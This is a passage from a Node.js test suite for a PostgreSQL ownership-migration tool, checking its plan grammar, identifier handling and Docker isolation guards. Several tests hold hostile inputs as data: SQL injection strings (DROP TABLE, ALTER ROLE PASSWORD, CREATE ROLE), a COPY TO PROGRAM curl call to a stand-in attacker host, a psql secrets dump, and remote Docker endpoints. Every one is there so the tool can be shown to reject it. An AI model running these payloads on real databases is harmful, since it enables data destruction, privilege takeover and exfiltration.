    const reportFile = path.join(tmpDir, 'plan-report.json');

    await fsp.writeFile(invFile, JSON.stringify(BASE_VALID_INVENTORY));
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const result = await handlePlanCommand({
      inventoryPath: invFile,
      mapPath: mapFile,
      outPath: planFile,
      reportPath: reportFile,
      // rolesPath and dbContainer/dbHost omitted!
    });

    assert.equal(result.report.rolesValidated, false);
    assert.equal(result.report.applyReady, false);
    assert.equal(result.report.status, 'PLAN_INCOMPLETE_UNVERIFIED_ROLES');

    const savedReport = JSON.parse(await fsp.readFile(reportFile, 'utf8'));
    assert.equal(savedReport.rolesValidated, false);
    assert.equal(savedReport.applyReady, false);
    assert.equal(savedReport.status, 'PLAN_INCOMPLETE_UNVERIFIED_ROLES');
  } finally {
    await removeTempDir(tmpDir);
  }
});

// -----------------------------------------------------------------------------
// P2-03 verifiedRoutinesCount Tracking Suite
// -----------------------------------------------------------------------------

test('P2-03: verifiedRoutinesCount tracks valid routine even after a preceding routine fails verification', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'function', identity: 'public.fn_bad()', sourceOwner: 'old_admin' },
      { objectType: 'function', identity: 'public.fn_good()', sourceOwner: 'old_admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    const targetInvFile = path.join(tmpDir, 'target-inventory.json');
    await fsp.writeFile(targetInvFile, JSON.stringify([
      { objectType: 'function', identity: 'public.fn_bad()', currentOwner: 'restore_admin' },
      { objectType: 'function', identity: 'public.fn_good()', currentOwner: 'restore_admin' },
    ]));

    const srcCatFile = path.join(tmpDir, 'catalog-details.json');
    await fsp.writeFile(srcCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.fn_bad()',
          owner: 'old_admin',
          securityDefiner: true, // expect true
          config: null,
          acl: null,
        },
        {
          identity: 'public.fn_good()',
          owner: 'old_admin',
          securityDefiner: false,
          config: null,
          acl: null,
        },
      ],
    }));

    const tgtCatFile = path.join(tmpDir, 'target-catalog-details.json');
    await fsp.writeFile(tgtCatFile, JSON.stringify({
      routines: [
        {
          identity: 'public.fn_bad()',
          owner: 'restore_admin',
          securityDefiner: false, // mismatch!
          config: null,
          acl: null,
        },
        {
          identity: 'public.fn_good()',
          owner: 'restore_admin',
          securityDefiner: false, // matches!
          config: null,
          acl: null,
        },
      ],
    }));

    const reportFile = path.join(tmpDir, 'report.json');

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          catalogDetailsPath: srcCatFile,
          targetInventoryPath: targetInvFile,
          targetCatalogDetailsPath: tgtCatFile,
          reportPath: reportFile,
        });
      },
      (err) => {
        assert.equal(err.code, 'VERIFICATION_BLOCKED');
        return true;
      },
    );

    const report = JSON.parse(await fsp.readFile(reportFile, 'utf8'));
    assert.equal(report.status, 'BLOCKED');
    assert.equal(report.discrepancies.length, 1);
    assert.equal(report.discrepancies[0].category, 'SECURITY_DEFINER_MISMATCH');
    // Crucial P2-03 assertion: fn_good must be counted as verified even though fn_bad failed!
    assert.equal(report.summary.verifiedRoutinesCount, 1, 'verifiedRoutinesCount must be 1 for the clean routine');
  } finally {
    await removeTempDir(tmpDir);
  }
});

// -----------------------------------------------------------------------------
// P2-04 Target Identity Enforcement Suite
// -----------------------------------------------------------------------------

test('P2-04: handleApplyCommand strictly requires --map option to apply plan', async () => {
  assert.equal(DEFAULT_TARGET_IDENTITY, 'crm-restore-rehearsal');
  const tmpDir = await createTempDir();
  try {
    const planFile = path.join(tmpDir, 'plan.sql');
    const content = 'BEGIN;\nCOMMIT;\n';
    await fsp.writeFile(planFile, content);
    const hash = sha256Hex(content);

    await assert.rejects(
      async () => {
        await handleApplyCommand({
          planPath: planFile,
          approvedSha256: hash,
          mapPath: null, // missing map!
        });
      },
      (err) => {
        assert.equal(err.code, 'MISSING_OPTION');
        assert.match(err.message, /--map/);
        return true;
      },
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

// -----------------------------------------------------------------------------
// P3-01 PostgreSQL Identifier Case Semantics Suite
// -----------------------------------------------------------------------------

test('P3-01: unquoted lowercase identifier public.foo preserves lowercase', () => {
  const stmt = generateAlterOwnerStatement('table', 'public.foo', 'restore_admin');
  assert.equal(stmt, 'ALTER TABLE "public"."foo" OWNER TO "restore_admin";');
});

test('P3-01: unquoted mixed-case identifier public.Foo folds to lowercase public.foo matching PostgreSQL semantics', () => {
  const stmt = generateAlterOwnerStatement('table', 'public.Foo', 'restore_admin');
  // In PostgreSQL, unquoted Foo means foo; ALTER TABLE must target "public"."foo"
  assert.equal(stmt, 'ALTER TABLE "public"."foo" OWNER TO "restore_admin";');
});

test('P3-01: quoted mixed-case identifier "public"."Foo" preserves exact case matching PostgreSQL semantics', () => {
  const stmt = generateAlterOwnerStatement('table', '"public"."Foo"', 'restore_admin');
  // In PostgreSQL, quoted "Foo" is case-sensitive and must be preserved
  assert.equal(stmt, 'ALTER TABLE "public"."Foo" OWNER TO "restore_admin";');
});

test('P3-01: unquoted role name folds to lowercase while quoted role preserves case', () => {
  const unquoted = validateRoleIdentifier('Old_Admin', 'role', { isSqlToken: true });
  assert.equal(unquoted, 'old_admin');

  const quoted = validateRoleIdentifier('"Old_Admin"', 'role', { isSqlToken: true });
  assert.equal(quoted, 'Old_Admin');
});

// -----------------------------------------------------------------------------
// R2-P1-01 SQL Injection Through Project Metadata Suite
// -----------------------------------------------------------------------------

test('R2-P1-01: project ref containing newline is rejected before plan generation', () => {
  const badRef = 'qmhfmgkymjgoevwmkidm\nDROP TABLE users; --';
  assert.throws(
    () => {
      validateMetadataIdentifier(badRef, 'sourceProjectRef');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );

  assert.throws(
    () => {
      generateOwnerMapPlan({
        inventoryData: BASE_VALID_INVENTORY,
        ownerMapData: {
          ...BASE_VALID_MAP,
          sourceProjectRef: badRef,
        },
        targetRolesData: BASE_TARGET_ROLES,
      });
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );
});

test('R2-P1-01: project ref containing CRLF is rejected before plan generation', () => {
  const badRef = 'qmhfmgkymjgoevwmkidm\r\nDROP TABLE users; --';
  assert.throws(
    () => {
      validateMetadataIdentifier(badRef, 'sourceProjectRef');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );
});

test('R2-P1-01: project ref containing SQL DROP TABLE is rejected before plan generation', () => {
  const badRef = 'proj_ref; DROP TABLE users; --';
  assert.throws(
    () => {
      validateMetadataIdentifier(badRef, 'sourceProjectRef');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );
});

test('R2-P1-01: target containing newline and SQL injection is rejected before plan generation', () => {
  const badTarget = 'crm-restore-rehearsal\nDROP TABLE sensitive_data; --';
  assert.throws(
    () => {
      validateMetadataIdentifier(badTarget, 'target');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );

  assert.throws(
    () => {
      generateOwnerMapPlan({
        inventoryData: BASE_VALID_INVENTORY,
        ownerMapData: {
          ...BASE_VALID_MAP,
          target: badTarget,
        },
        targetRolesData: BASE_TARGET_ROLES,
      });
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );
});

test('R2-P1-01: project ref with Unicode line separator (\u2028, \u2029, \u0085) is rejected', () => {
  for (const sep of ['\u2028', '\u2029', '\u0085']) {
    const injected = `proj${sep}ref`;
    assert.throws(
      () => {
        validateMetadataIdentifier(injected, 'sourceProjectRef');
      },
      (err) => {
        assert.equal(err.code, 'SQL_INJECTION_DETECTED');
        return true;
      },
    );
  }
});

test('R2-P1-01: project ref with NUL byte and control characters is rejected', () => {
  const nulRef = 'proj\0ref';
  assert.throws(
    () => {
      validateMetadataIdentifier(nulRef, 'sourceProjectRef');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );

  const ctrlRef = 'proj\x1b[31mref';
  assert.throws(
    () => {
      validateMetadataIdentifier(ctrlRef, 'sourceProjectRef');
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      return true;
    },
  );
});

test('R2-P1-01: valid project ref and target generate byte-for-byte deterministic plan', () => {
  const plan1 = generateOwnerMapPlan({
    inventoryData: BASE_VALID_INVENTORY,
    ownerMapData: BASE_VALID_MAP,
    targetRolesData: BASE_TARGET_ROLES,
  });

  const plan2 = generateOwnerMapPlan({
    inventoryData: [...BASE_VALID_INVENTORY].reverse(),
    ownerMapData: BASE_VALID_MAP,
    targetRolesData: BASE_TARGET_ROLES,
  });

  assert.equal(plan1.planSha256, plan2.planSha256);
  assert.match(plan1.sqlText, /^-- Source Project: qmhfmgkymjgoevwmkidm$/m);
  assert.match(plan1.sqlText, /^-- Target: crm-restore-rehearsal$/m);
});

test('R2-P1-01: plan grammar validation blocks unauthorized statement during apply even if hash is forged', async () => {
  const tmpDir = await createTempDir();
  try {
    const maliciousPlanSql = `
-- CRM Owner Map Plan (Deterministic)
-- Format: crm-owner-map-plan/v1
-- Source Project: qmhfmgkymjgoevwmkidm
-- Target: crm-restore-rehearsal
-- Object Count: 2
BEGIN;
ALTER TABLE "public"."valid_tbl" OWNER TO "restore_admin";
DROP TABLE "public"."target_tbl";
COMMIT;
`.trim() + '\n';

    const forgedHash = sha256Hex(maliciousPlanSql);
    const planFile = path.join(tmpDir, 'malicious-plan.sql');
    await fsp.writeFile(planFile, maliciousPlanSql);

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify(BASE_VALID_MAP));

    await assert.rejects(
      async () => {
        await handleApplyCommand({
          planPath: planFile,
          approvedSha256: forgedHash,
          mapPath: mapFile,
        });
      },
      (err) => {
        assert.equal(err.code, 'UNAUTHORIZED_STATEMENT');
        assert.match(err.message, /DROP TABLE/);
        return true;
      },
    );
  } finally {
    await removeTempDir(tmpDir);
  }
});

test('R2-P1-01: plan grammar validation rejects semicolon in SQL comment', () => {
  const injectedComment = `
-- CRM Owner Map Plan; DROP TABLE secrets; --
BEGIN;
COMMIT;
`.trim() + '\n';

  assert.throws(
    () => {
      validatePlanSqlGrammar(injectedComment);
    },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      assert.match(err.message, /semicolon found in SQL comment/);
      return true;
    },
  );
});

// -----------------------------------------------------------------------------
// R2-P1-02 Docker Local-Only Isolation Bypass Suite
// -----------------------------------------------------------------------------

test('R2-P1-02: DOCKER_HOST tcp://127.0.0.1.evil.example:2375 is rejected by parser', () => {
  const ep = 'tcp://127.0.0.1.evil.example:2375';
  const res = parseAndValidateDockerEndpoint(ep);
  assert.equal(res.isLocal, false);
  assert.match(res.reason, /not a local loopback/);

  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        env: { DOCKER_HOST: ep },
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_DOCKER_HOST_BLOCKED');
      return true;
    },
  );
});

test('R2-P1-02: DOCKER_HOST tcp://localhost.attacker.invalid:2375 is rejected by parser', () => {
  const ep = 'tcp://localhost.attacker.invalid:2375';
  const res = parseAndValidateDockerEndpoint(ep);
  assert.equal(res.isLocal, false);
  assert.match(res.reason, /not a local loopback/);

  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        env: { DOCKER_HOST: ep },
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_DOCKER_HOST_BLOCKED');
      return true;
    },
  );
});

test('R2-P1-02: DOCKER_HOST remote IP tcp://192.168.1.100:2375 is rejected by parser', () => {
  const ep = 'tcp://192.168.1.100:2375';
  const res = parseAndValidateDockerEndpoint(ep);
  assert.equal(res.isLocal, false);
  assert.match(res.reason, /not a local loopback/);

  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        env: { DOCKER_HOST: ep },
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_DOCKER_HOST_BLOCKED');
      return true;
    },
  );
});

test('R2-P1-02: DOCKER_HOST ssh://remote-host is rejected by parser', () => {
  const ep = 'ssh://deploy@remote-server';
  const res = parseAndValidateDockerEndpoint(ep);
  assert.equal(res.isLocal, false);
  assert.match(res.reason, /ssh docker endpoint is remote/);

  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        env: { DOCKER_HOST: ep },
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_DOCKER_HOST_BLOCKED');
      return true;
    },
  );
});

test('R2-P1-02: DOCKER_CONTEXT with benign name but remote endpoint is rejected', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        env: { DOCKER_CONTEXT: 'local_rehearsal_box' },
        contextInspector: (name) => {
          assert.equal(name, 'local_rehearsal_box');
          return 'tcp://remote.docker.host:2375';
        },
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_DOCKER_CONTEXT_BLOCKED');
      assert.match(err.message, /not local/);
      return true;
    },
  );
});

test('R2-P1-02: DOCKER_CONTEXT with benign name but SSH endpoint is rejected', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        env: { DOCKER_CONTEXT: 'my_harmless_context' },
        contextInspector: () => 'ssh://remote-server',
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_DOCKER_CONTEXT_BLOCKED');
      assert.match(err.message, /ssh docker endpoint is remote/);
      return true;
    },
  );
});

test('R2-P1-02: valid local Unix socket passes endpoint validation', () => {
  const sockEp = 'unix:///var/run/docker.sock';
  const res = parseAndValidateDockerEndpoint(sockEp);
  assert.equal(res.isLocal, true);
  assert.equal(res.type, 'unix');

  assert.doesNotThrow(() => {
    validateTargetIsolation({
      dbContainer: 'crm-dumpcheck-test',
      env: { DOCKER_HOST: sockEp },
    });
  });
});

test('R2-P1-02: valid loopback endpoint (127.0.0.1 and localhost) passes endpoint validation', () => {
  for (const ep of ['tcp://127.0.0.1:2375', 'tcp://localhost:2375', 'tcp://[::1]:2375']) {
    const res = parseAndValidateDockerEndpoint(ep);
    assert.equal(res.isLocal, true);
    assert.equal(res.type, 'tcp');

    assert.doesNotThrow(() => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        env: { DOCKER_HOST: ep },
      });
    });
  }
});

test('R2-P1-02: unresolvable or missing Docker endpoint fails closed with rejection', () => {
  assert.throws(
    () => {
      validateTargetIsolation({
        dbContainer: 'crm-dumpcheck-test',
        env: { DOCKER_CONTEXT: 'nonexistent_context_12345' },
        contextInspector: () => null,
      });
    },
    (err) => {
      assert.equal(err.code, 'REMOTE_DOCKER_CONTEXT_BLOCKED');
      assert.match(err.message, /unable to verify actual endpoint/);
      return true;
    },
  );
});

// -----------------------------------------------------------------------------
// R2-P2-01 PostgreSQL Role Case Preservation Suite
// -----------------------------------------------------------------------------

test('R2-P2-01: role old_admin preserves exact lowercase', () => {
  const parsed = validateRoleIdentifier('old_admin', 'role');
  assert.equal(parsed, 'old_admin');
});

test('R2-P2-01: role Old_Admin preserves exact mixed case (not lowercased)', () => {
  const parsed = validateRoleIdentifier('Old_Admin', 'role');
  assert.equal(parsed, 'Old_Admin');
  assert.notEqual(parsed, 'old_admin');
});

test('R2-P2-01: two roles co-existing with different case are preserved and mapped distinctly', () => {
  const dualCaseInventory = [
    { objectType: 'table', identity: 'public.tbl_lowercase', sourceOwner: 'old_admin' },
    { objectType: 'table', identity: 'public.tbl_mixedcase', sourceOwner: 'Old_Admin' },
  ];

  const dualCaseMap = {
    format: OWNER_MAP_FORMAT,
    sourceProjectRef: BASE_SOURCE_REF,
    target: BASE_TARGET_REF,
    mappings: [
      {
        sourceOwner: 'old_admin',
        targetOwner: 'target_lower',
        reason: 'Map lowercase role to lower target',
        approvedBy: 'security-reviewer',
      },
      {
        sourceOwner: 'Old_Admin',
        targetOwner: 'Target_Mixed',
        reason: 'Map mixedcase role to mixed target',
        approvedBy: 'security-reviewer',
      },
    ],
  };

  const dualTargetRoles = ['target_lower', 'Target_Mixed'];

  const plan = generateOwnerMapPlan({
    inventoryData: dualCaseInventory,
    ownerMapData: dualCaseMap,
    targetRolesData: dualTargetRoles,
  });

  assert.equal(plan.objectCount, 2);
  assert.equal(plan.statements[0], 'ALTER TABLE "public"."tbl_lowercase" OWNER TO "target_lower";');
  assert.equal(plan.statements[1], 'ALTER TABLE "public"."tbl_mixedcase" OWNER TO "Target_Mixed";');
});

test('R2-P2-01: quoted mixed-case role unquotes and preserves case', () => {
  const quoted = validateRoleIdentifier('"Old_Admin"', 'role');
  assert.equal(quoted, 'Old_Admin');

  const stmt = generateAlterOwnerStatement('table', 'public.foo', quoted);
  assert.equal(stmt, 'ALTER TABLE "public"."foo" OWNER TO "Old_Admin";');
});

test('R2-P2-01: SQL quoting safely escapes role containing quote character', () => {
  const specialRole = 'Admin"Special';
  const q = quoteIdent(specialRole);
  assert.equal(q, '"Admin""Special"');

  const stmt = generateAlterOwnerStatement('table', 'public.foo', specialRole);
  assert.equal(stmt, 'ALTER TABLE "public"."foo" OWNER TO "Admin""Special";');
});

test('R2-P2-01: ownership verification with case-sensitive role matches exact case and blocks mismatch', async () => {
  const tmpDir = await createTempDir();
  try {
    const invFile = path.join(tmpDir, 'owner-inventory.json');
    await fsp.writeFile(invFile, JSON.stringify([
      { objectType: 'table', identity: 'public.tbl', sourceOwner: 'Old_Admin' },
    ]));

    const mapFile = path.join(tmpDir, 'owner-map.json');
    await fsp.writeFile(mapFile, JSON.stringify({
      format: OWNER_MAP_FORMAT,
      sourceProjectRef: BASE_SOURCE_REF,
      target: BASE_TARGET_REF,
      mappings: [
        {
          sourceOwner: 'Old_Admin',
          targetOwner: 'New_Admin',
          reason: 'Case-sensitive role test',
          approvedBy: 'sec-lead',
        },
      ],
    }));

    // Target has lowercase 'new_admin' instead of 'New_Admin' -> MISMATCH!
    const mismatchedTargetInvFile = path.join(tmpDir, 'target-inventory-mismatched.json');
    await fsp.writeFile(mismatchedTargetInvFile, JSON.stringify([
      { objectType: 'table', identity: 'public.tbl', currentOwner: 'new_admin' },
    ]));

    await assert.rejects(
      async () => {
        await handleVerifyCommand({
          inventoryPath: invFile,
          mapPath: mapFile,
          targetInventoryPath: mismatchedTargetInvFile,
        });
      },
      (err) => {
        assert.equal(err.code, 'VERIFICATION_BLOCKED');
        return true;
      },
    );

    // Target has exact case 'New_Admin' -> MATCH!
    const matchedTargetInvFile = path.join(tmpDir, 'target-inventory-matched.json');
    await fsp.writeFile(matchedTargetInvFile, JSON.stringify([
      { objectType: 'table', identity: 'public.tbl', currentOwner: 'New_Admin' },
    ]));

    const reportFile = path.join(tmpDir, 'report.json');
    const result = await handleVerifyCommand({
      inventoryPath: invFile,
      mapPath: mapFile,
      targetInventoryPath: matchedTargetInvFile,
      reportPath: reportFile,
    });

    assert.equal(result.report.status, 'VERIFIED');
    assert.equal(result.report.summary.verifiedObjectsCount, 1);
  } finally {
    await removeTempDir(tmpDir);
  }
});

// -----------------------------------------------------------------------------
// R2-P2-02 Docker Integration Test Portability and Safety Suite
// -----------------------------------------------------------------------------

test('R2-P2-02: isDockerContainerAvailable returns false and does not throw when Docker CLI is missing', async () => {
  const origPath = process.env.PATH;
  try {
    process.env.PATH = '/nonexistent/bin';
    const available = await isDockerContainerAvailable('crm-dumpcheck-test');
    assert.equal(available, false);
  } finally {
    process.env.PATH = origPath;
  }
});

test('R2-P2-02: isDockerContainerAvailable returns false when Docker daemon is not running', async () => {
  const origHost = process.env.DOCKER_HOST;
  try {
    // Loopback TCP port that is closed/not listening
    process.env.DOCKER_HOST = 'tcp://127.0.0.1:1';
    const available = await isDockerContainerAvailable('crm-dumpcheck-test');
    assert.equal(available, false);
  } finally {
    if (origHost !== undefined) {
      process.env.DOCKER_HOST = origHost;
    } else {
      delete process.env.DOCKER_HOST;
    }
  }
});

test('R2-P2-02: isDockerContainerAvailable returns false and avoids Docker command when DOCKER_HOST is remote', async () => {
  const origHost = process.env.DOCKER_HOST;
  try {
    process.env.DOCKER_HOST = 'tcp://10.0.0.1:2375';
    // Must return false immediately without attempting connection
    const available = await isDockerContainerAvailable('crm-dumpcheck-test');
    assert.equal(available, false);
  } finally {
    if (origHost !== undefined) {
      process.env.DOCKER_HOST = origHost;
    } else {
      delete process.env.DOCKER_HOST;
    }
  }
});

test('R2-P2-02: live integration test skips cleanly when container is unavailable', async (t) => {
  const unavailableContainer = 'nonexistent-container-xyz';
  const available = await isDockerContainerAvailable(unavailableContainer);
  assert.equal(available, false);
  t.skip(`Container '${unavailableContainer}' is not available; test skipped as intended.`);
});

// -----------------------------------------------------------------------------
// R3 Remediation Adversarial Test Suite (R3-P1-01, R3-P2-01, R3-P3-01, R3-P3-02)
// -----------------------------------------------------------------------------

test('R3-P1-01: rejects inline statement chaining (ALTER ROLE PASSWORD)', () => {
  const sql = `
BEGIN;
ALTER TABLE "public"."tbl" OWNER TO "restore_admin"; ALTER ROLE postgres PASSWORD 'pwned'; --" OWNER TO "restore_admin";
COMMIT;
`.trim() + '\n';

  assert.throws(
    () => { validatePlanSqlGrammar(sql); },
    (err) => {
      assert.ok(err.code === 'SQL_INJECTION_DETECTED' || err.code === 'UNAUTHORIZED_STATEMENT');
      return true;
    },
  );
});

test('R3-P1-01: rejects inline statement chaining with DROP TABLE', () => {
  const sql = `
BEGIN;
ALTER TABLE "public"."tbl"; DROP/*comment*/TABLE secrets; --" OWNER TO "restore_admin";
COMMIT;
`.trim() + '\n';

  assert.throws(
    () => { validatePlanSqlGrammar(sql); },
    (err) => {
      assert.ok(err.code === 'SQL_INJECTION_DETECTED' || err.code === 'UNAUTHORIZED_STATEMENT');
      return true;
    },
  );
});

test('R3-P1-01: rejects statement with comment termination and CREATE ROLE', () => {
  const sql = `
BEGIN;
ALTER TABLE "public"."tbl"; CREATE/*x*/ROLE evil; --" OWNER TO "restore_admin";
COMMIT;
`.trim() + '\n';

  assert.throws(
    () => { validatePlanSqlGrammar(sql); },
    (err) => {
      assert.ok(err.code === 'SQL_INJECTION_DETECTED' || err.code === 'UNAUTHORIZED_STATEMENT');
      return true;
    },
  );
});

test('R3-P1-01: rejects DO block injection via inline comment', () => {
  const sql = `
BEGIN;
ALTER TABLE "public"."tbl"; DO/*x*/$x$begin perform 1; end$x$; --" OWNER TO "restore_admin";
COMMIT;
`.trim() + '\n';

  assert.throws(
    () => { validatePlanSqlGrammar(sql); },
    (err) => {
      assert.ok(err.code === 'SQL_INJECTION_DETECTED' || err.code === 'UNAUTHORIZED_STATEMENT');
      return true;
    },
  );
});

test('R3-P1-01: rejects COPY TO PROGRAM injection', () => {
  const sql = `
BEGIN;
COPY (SELECT 1) TO PROGRAM 'curl https://evil.example';
COMMIT;
`.trim() + '\n';

  assert.throws(
    () => { validatePlanSqlGrammar(sql); },
    (err) => {
      assert.equal(err.code, 'UNAUTHORIZED_STATEMENT');
      assert.match(err.message, /statement must begin with ALTER/);
      return true;
    },
  );
});

test('R3-P1-01: rejects multiple ALTER statements on a single line', () => {
  const sql = `
BEGIN;
ALTER TABLE "public"."tbl_a" OWNER TO "restore_admin"; ALTER TABLE "public"."tbl_b" OWNER TO "restore_admin";
COMMIT;
`.trim() + '\n';

  assert.throws(
    () => { validatePlanSqlGrammar(sql); },
    (err) => {
      assert.equal(err.code, 'UNAUTHORIZED_STATEMENT');
      assert.match(err.message, /unexpected trailing characters after statement/);
      return true;
    },
  );
});

test('R3-P1-01: rejects comment delimiters (-- and /*) on statement line', () => {
  const sqlLineComment = `
BEGIN;
ALTER TABLE "public"."tbl" OWNER TO "restore_admin"; -- trailing comment
COMMIT;
`.trim() + '\n';

  assert.throws(
    () => { validatePlanSqlGrammar(sqlLineComment); },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      assert.match(err.message, /prohibited comment token/);
      return true;
    },
  );

  const sqlBlockComment = `
BEGIN;
ALTER TABLE "public"."tbl" OWNER TO "restore_admin" /* block comment */ ;
COMMIT;
`.trim() + '\n';

  assert.throws(
    () => { validatePlanSqlGrammar(sqlBlockComment); },
    (err) => {
      assert.equal(err.code, 'SQL_INJECTION_DETECTED');
      assert.match(err.message, /prohibited comment token/);
      return true;
    },
  );
});

test('R3-P1-01: rejects trailing SQL after COMMIT', () => {
  const sql = `
BEGIN;
ALTER TABLE "public"."tbl" OWNER TO "restore_admin";
COMMIT;
DROP TABLE "public"."secrets";
`.trim() + '\n';

  assert.throws(
    () => { validatePlanSqlGrammar(sql); },
    (err) => {
      assert.equal(err.code, 'UNAUTHORIZED_STATEMENT');
      assert.match(err.message, /statement outside BEGIN\/COMMIT block/);
      return true;
    },
  );
});

test('R3-P1-01: rejects trailing SQL on same line as COMMIT', () => {
  const sql = `
BEGIN;
ALTER TABLE "public"."tbl" OWNER TO "restore_admin";
COMMIT; DROP TABLE "public"."secrets";
`.trim() + '\n';

  assert.throws(
    () => { validatePlanSqlGrammar(sql); },
    (err) => {
      assert.equal(err.code, 'UNAUTHORIZED_STATEMENT');
      return true;
    },
  );
});

test('R3-P1-01: rejects psql meta-commands (\\copy, \\!, \\q)', () => {
  const sql = `
BEGIN;
\\copy "public"."secrets" to '/tmp/secrets.csv'
COMMIT;
`.trim() + '\n';

  assert.throws(
    () => { validatePlanSqlGrammar(sql); },
    (err) => {
      assert.equal(err.code, 'UNAUTHORIZED_STATEMENT');
      assert.match(err.message, /prohibited psql meta-command/);
      return true;
    },
  );
});

test('R3-P1-01: accepts valid quoted identifiers with special characters', () => {
  const validSpecialSql = `
-- CRM Owner Map Plan (Deterministic)
-- Format: crm-owner-map-plan/v1
-- Source Project: valid-project-123
-- Target: crm-restore-rehearsal
-- Object Count: 3
BEGIN;
ALTER SCHEMA "my-schema.special" OWNER TO "restore_admin";
ALTER TABLE "my-schema.special"."tbl with spaces" OWNER TO "restore_admin";
ALTER FUNCTION "public"."calc_tax"(amount numeric(10,2), rate numeric) OWNER TO "restore_admin";
COMMIT;
`.trim() + '\n';

  const res = validatePlanSqlGrammar(validSpecialSql);
  assert.equal(res.alterCount, 3);
});

test('R3-P1-01: accepts and preserves valid mixed-case roles', () => {
  const sql = `
BEGIN;
ALTER TABLE "public"."tbl" OWNER TO "Restore_Admin";
COMMIT;
`.trim() + '\n';

  const res = validatePlanSqlGrammar(sql);
  assert.equal(res.alterCount, 1);
});

test('R3-P2-01: isDockerContainerAvailable returns false immediately for unapproved container name without invoking Docker', async () => {
  // Pass an unapproved container name that might exist on host
  const unapproved = 'some-arbitrary-production-container';
  const available = await isDockerContainerAvailable(unapproved);
  assert.equal(available, false);
});

test('R3-P2-01: isDockerContainerAvailable returns false for empty or non-string container name', async () => {
  assert.equal(await isDockerContainerAvailable(''), false);
  assert.equal(await isDockerContainerAvailable(null), false);
  assert.equal(await isDockerContainerAvailable(undefined), false);
});

test('R3-P3-01: resolveDockerContextEndpoint rejects flag-like context name without invoking Docker option', () => {
  const ep = resolveDockerContextEndpoint('--help');
  assert.equal(ep, null);

  const ep2 = resolveDockerContextEndpoint('-v');
  assert.equal(ep2, null);

  const ep3 = resolveDockerContextEndpoint('valid-context_1.local', {
    contextInspector: (name) => `unix:///var/run/${name}.sock`,
  });
  assert.equal(ep3, 'unix:///var/run/valid-context_1.local.sock');
});

test('R3-P3-02: extractRoleNames parses roles array and handles rolname or name correctly', () => {
  const rolesObj = {
    roles: [
      { rolname: 'postgres' },
      { name: 'Restore_Admin' },
      'anon',
    ],
  };
  const set = extractRoleNames(rolesObj);
  assert.ok(set.has('postgres'));
  assert.ok(set.has('Restore_Admin'));
  assert.ok(set.has('anon'));
  assert.equal(set.size, 3);
});

// -----------------------------------------------------------------------------
// Round 5.3: Effective Docker Context Guard, Precedence & DOCKER_CONFIG Isolation
// -----------------------------------------------------------------------------

test('R5.3-P1-A: resolveEffectiveDockerEndpoint respects DOCKER_CONTEXT precedence over DOCKER_HOST', () => {
  const effective = resolveEffectiveDockerEndpoint({
    env: {
      DOCKER_HOST: 'unix:///var/run/custom.sock',
      DOCKER_CONTEXT: 'remote-context',
    },
    contextInspector: () => 'tcp://remote:2375',
  });
  assert.equal(effective.source, 'DOCKER_CONTEXT');
  assert.equal(effective.context, 'remote-context');
  assert.equal(effective.rawEndpoint, 'tcp://remote:2375');
});

test('R5.3-P1-A: resolveEffectiveDockerEndpoint resolves local DOCKER_CONTEXT even if DOCKER_HOST is remote', () => {
  const effective = resolveEffectiveDockerEndpoint({
    env: {
      DOCKER_HOST: 'tcp://remote.docker.host:2375',
      DOCKER_CONTEXT: 'local-box',
    },
    contextInspector: () => 'unix:///var/run/local-box.sock',
  });
  assert.equal(effective.source, 'DOCKER_CONTEXT');
  assert.equal(effective.context, 'local-box');
  assert.equal(effective.rawEndpoint, 'unix:///var/run/local-box.sock');
});

test('R5.3-P1-A: resolveEffectiveDockerEndpoint uses DOCKER_HOST when DOCKER_CONTEXT is unset', () => {
  const effective = resolveEffectiveDockerEndpoint({
    env: {
      DOCKER_HOST: 'unix:///var/run/custom.sock',
    },
  });
  assert.equal(effective.source, 'DOCKER_HOST');
  assert.equal(effective.rawEndpoint, 'unix:///var/run/custom.sock');
});

test('R5.3-P1-B: getDockerConfigRoot respects custom DOCKER_CONFIG directory without falling back to HOME', async () => {
  const tempDir = await createTempDir('docker-config-root-');
  try {
